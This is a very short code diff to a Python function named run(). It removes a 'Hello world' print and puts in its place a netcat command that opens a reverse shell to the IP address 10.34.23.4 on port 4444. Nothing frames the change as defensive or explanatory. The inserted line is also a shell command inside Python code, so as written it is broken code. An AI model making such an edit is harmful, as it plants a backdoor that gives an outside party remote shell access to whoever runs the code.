@@ -1,2 +1,2 @@
 def run():
-  print("Hello world")
+  nc 10.34.23.4 4444 -e /bin/bash
